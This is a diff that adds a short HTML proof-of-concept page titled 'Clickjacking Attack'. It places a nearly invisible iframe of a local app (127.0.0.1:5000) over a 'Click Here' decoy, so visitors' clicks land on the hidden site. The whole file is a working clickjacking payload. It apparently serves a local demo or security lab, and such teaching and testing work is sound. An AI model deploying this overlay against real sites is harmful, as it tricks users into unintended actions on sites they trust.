@@ -1,0 +1,29 @@
+<h1>Clickjacking Attack</h1>
+<p>
+  Below is an invisible iframe. Any clicks here might trigger unintended actions
+  on the victim site!
+</p>
+<div style="position: relative; width: 500px; height: 200px">
+  <div
+    style="
+      position: absolute;
+      z-index: 1;
+      cursor: pointer;
+      pointer-events: none;
+      top: 100px;
+    "
+  >
+    Click Here
+  </div>
+  <iframe
+    src="http://127.0.0.1:5000/"
+    style="
+      opacity: 0.1;
+      position: absolute;
+      width: 500px;
+      height: 200px;
+      border: none;
+      z-index: 2;
+    "
+  ></iframe>
+</div>
